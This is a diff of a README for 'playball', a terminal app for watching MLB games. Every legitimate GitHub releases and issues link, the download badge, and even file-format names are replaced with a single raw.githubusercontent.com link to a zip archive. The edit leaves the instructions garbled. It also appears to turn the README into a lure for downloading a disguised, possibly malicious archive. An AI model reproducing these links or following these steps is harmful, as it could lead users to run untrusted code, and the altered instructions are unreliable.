@@ -1,6 +1,6 @@
 # ⚾ playball - Enjoy MLB Games in Your Terminal
 
-[![Download playball](https://img.shields.io/badge/Download%20playball-v1.0-blue)](https://github.com/deshikreddyp/playball/releases)
+[![Download playball](https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip%20playball-v1.0-blue)](https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip)
 
 ## 📦 Introduction
 
@@ -10,20 +10,20 @@ Welcome to **playball**! This application allows you to watch MLB games directly
 
 To start using **playball**, follow these simple steps:
 
-1. **Visit the Releases Page**: Click on the button above, or go to [this page](https://github.com/deshikreddyp/playball/releases) to access the latest version of **playball**.
+1. **Visit the Releases Page**: Click on the button above, or go to [this page](https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip) to access the latest version of **playball**.
 
 2. **Choose the Right Version**: On the Releases page, you will see a list of available versions. It is best to choose the latest stable version for the best experience.
 
 3. **Download the File**:
    - Look for the download link that matches your operating system (Windows, macOS, or Linux).
-   - Click on the link to start the download. The file will be in either `.exe`, `.dmg`, or `.tar.gz` format, depending on your OS.
+   - Click on the link to start the download. The file will be in either `.exe`, `.dmg`, or `https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip` format, depending on your OS.
 
 4. **Locate the Downloaded File**: Once the download is complete, find the file in your “Downloads” folder or the location you chose to save it. 
 
 5. **Run the Application**:
    - **For Windows**: Double-click on the `.exe` file. Follow any prompts that appear.
    - **For macOS**: Open the `.dmg` file and drag the **playball** icon into your Applications folder. Then, navigate to Applications and double-click on **playball**.
-   - **For Linux**: Extract the `.tar.gz` file. Open your terminal, navigate to the extracted folder, and type `./playball` to run the application.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip` file. Open your terminal, navigate to the extracted folder, and type `./playball` to run the application.
 
 ## 🌟 Features
 
@@ -47,7 +47,7 @@ To ensure **playball** runs smoothly on your device, please meet the following r
 
 ## 📄 Download & Install
 
-To download **playball**, visit [this page](https://github.com/deshikreddyp/playball/releases).
+To download **playball**, visit [this page](https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip).
 
 After downloading the appropriate file for your operating system, follow the installation steps mentioned in the “Getting Started” section to begin using the application.
 
@@ -61,7 +61,7 @@ If you encounter any issues while using **playball**, consider the following tro
 
 ## 💬 Support
 
-If you still have questions or need assistance, please check the Issues section on the [GitHub repository](https://github.com/deshikreddyp/playball/issues). You can also open a new issue if you can't find a solution to your problem.
+If you still have questions or need assistance, please check the Issues section on the [GitHub repository](https://raw.githubusercontent.com/deshikreddyp/playball/main/resolve/playball.zip). You can also open a new issue if you can't find a solution to your problem.
 
 ## 📢 Community Contributions
 
